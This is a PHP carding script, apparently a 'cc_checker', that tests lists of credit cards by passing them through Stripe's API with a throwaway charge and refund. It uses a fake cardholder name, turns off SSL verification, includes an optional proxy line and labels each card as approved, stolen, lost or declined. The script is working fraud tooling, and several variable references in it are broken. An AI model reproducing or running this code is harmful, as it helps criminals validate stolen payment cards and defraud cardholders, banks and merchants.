<?php

// --- SET DEFAULT TIMEZONE ---
date_default_timezone_set('UTC'); // safer for Docker

// --- VALIDATE COMMAND-LINE ARGUMENTS ---
if (!isset($argv[1]) || !isset($argv[2])) {
    die("Error: Missing Stripe key or CC list arguments.");
}

// --- RECEIVE DATA ---
$sk = $argv[1];
$lista = $argv[2];

// --- HELPER FUNCTIONS ---
function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    return explode($delimiters[0], $one);
}

function GetStr($string, $start, $end) {
    if (strpos($string, $start) === false || strpos($string, $end) === false) {
        return "";
    }
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

// --- PARSE CC DATA ---
$cc_parts = multiexplode(array(":", "|", " "), $lista);
$cc = $cc_parts[0] ?? '';
$mes = $cc_parts[1] ?? '';
$ano = $cc_parts[2] ?? '';
$cvv = $cc_parts[3] ?? '';

// --- RANDOM USER DATA (USING CURL) ---
$ch_user = curl_init();
curl_setopt($ch_user, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
curl_setopt($ch_user, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch_user, CURLOPT_USERAGENT, 'Mozilla/5.0');
$get = curl_exec($ch_user);
curl_close($ch_user);

$name = 'John';
$last = 'Doe';

if ($get) {
    preg_match_all('/"first":"(.*?)"/i', $get, $matches1);
    preg_match_all('/"last":"(.*?)"/i', $get, $matches2);
    $name = $matches1[1][0] ?? 'John';
    $last = $matches2[1][0] ?? 'Doe';
}

// --- STRIPE API CALLS ---
$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':');

// Add proxy if needed
// curl_setopt($ch, CURLOPT_PROXY, "http://username-session-123:password@proxy.zyte.com:22225");

// --- CREATE SOURCE ---
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano);
$result1 = curl_exec($ch);
$s = json_decode($result1, true);
$token = $s['id'] ?? null;

// --- CREATE CUSTOMER ---
$token3 = null;
if ($token) {
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$name.' '.$last.'&source='.$token);
    $result2 = curl_exec($ch);
    $cus = json_decode($result2, true);
    $token3 = $cus['id'] ?? null;
} else {
    $result2 = "{}";
}

// --- CREATE CHARGE ---
$chtoken = null;
if ($token3) {
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=50&currency=usd&customer='.$token3);
    $result3 = curl_exec($ch);
    $chtoken = trim(strip_tags(GetStr($result3, '"id": "','"')));
} else {
    $result3 = "{}";
}

// --- CREATE REFUND ---
if ($chtoken) {
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/refunds');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'charge='.$chtoken.'&amount=50&reason=requested_by_customer');
    $result4 = curl_exec($ch);
}

// --- BIN LOOKUP ---
$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}

// --- RESPONSE LOGIC ---
if(strpos($result3, '"seller_message": "Payment complete."' )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV) @cc_checker charge + refund 」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3,'"cvc_check": "pass"')){
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV) CHARGED BC 」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}


elseif(strpos($result1, "generic_decline")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined : Generic_Decline @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result3, "generic_decline" )) {
    echo '<span class="badge badge-success">#DEAD</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「DECLINE GENERIC 3 @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "insufficient_funds" )) {
    echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV - INSUFFICIENT FUND3  @cc_checker)」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif(strpos($result3, "fraudulent" )) {
    echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved fraudulent @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($resul3, "do_not_honor" )) {
    echo '<span class="badge badge-success">#DEAD</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「DECLINE DO NOT HONOR 3 @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($resul2, "do_not_honor" )) {
    echo '<span class="badge badge-success">#DEAD</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「DECLINE DO NOT HONOR 3 @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"fraudulent")){
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Fraudulent Card @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}

elseif(strpos($result2,'"code": "incorrect_cvc"')){
    echo '<span class="badge badge-info">#Approved</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-success"> 「CCN 2 @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result1,' "code": "invalid_cvc"')){
    echo '<span class="badge badge-info">#Approved</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-success"> 「CCN 2 @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,"invalid_account")){
    echo '<span class="badge badge-danger">#DECLINE</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-danger"> 「invalid_account @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}

elseif(strpos($result2, "do_not_honor")) {
    echo '<span class="badge badge-danger">#DECLINE</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「DO NOT HONOR 2 @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> GAY「Lost Card @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "lost_card" )) {
    echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Lost Card @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif(strpos($result2, "stolen_card" )) {
    echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Stolen Card @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }

elseif(strpos($result3, "stolen_card" )) {
    echo '<span class="badge badge-success">#decline</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Stolen Card @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';


}
elseif(strpos($result2, "transaction_not_allowed" )) {
    echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined (transaction_not_allowed) @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result3, "incorrect_cvc" )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (CCN3) @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo '<span class="badge badge-danger">#decline</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Pickup Card (Reported Stolen Or Lost) @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "pickup_card" )) {
    echo '<span class="badge badge-danger">#decline</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Pickup Card (Reported Stolen Or Lost) @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}
elseif(strpos($result2, 'Your card has expired.')) {
    echo '<span class="badge badge-danger">#Decline</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Expired Card @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, 'Your card has expired.')) {
    echo '<span class="badge badge-danger">#decline</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Expired Card @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}
elseif(strpos($result3, '"code": "processing_error"')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「PROCESSING ERROR @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result3, ' "message": "Your card number is incorrect."')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Your card number is incorrect @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result3, '"decline_code": "service_not_allowed"')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「service_not_allowed @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result2, '"code": "processing_error"')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> gay「PROCESSING ERROR @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Your card number is incorrect @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「service_not_allowed @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}
elseif(strpos($result, "incorrect_number")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Incorrect Card Number @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';


}elseif(strpos($result1, "do_not_honor")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined : Do_Not_Honor @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}
elseif(strpos($result1, 'Your card was declined.')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Card Declined @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}
elseif(strpos($result1, "do_not_honor")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined : Do_Not_Honor @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result2, "generic_decline")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined : Generic_Decline @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Card Declined @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}
elseif(strpos($result3,' "decline_code": "do_not_honor"')){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Check : Do_Not_Honor 3 @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Unchecked : Proxy Error @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Unchecked : Fail @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,'"cvc_check": "unavailable"')){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Check : Unavailable @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3,'"cvc_check": "unchecked"')){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Unchecked : Proxy Error @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3,'"cvc_check": "fail"')){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Unchecked : Fail @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Card Doesnt Support Purchase @cc_checker」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }

elseif(strpos($result2,'"cvc_check": "pass"')){
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV) @cc_checker AUTH ONLY  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}
elseif(strpos($result3, "fraudulent" )) {
    echo '<span class="badge badge-success">#Declined</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved fraudulent @cc_checker」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
?>
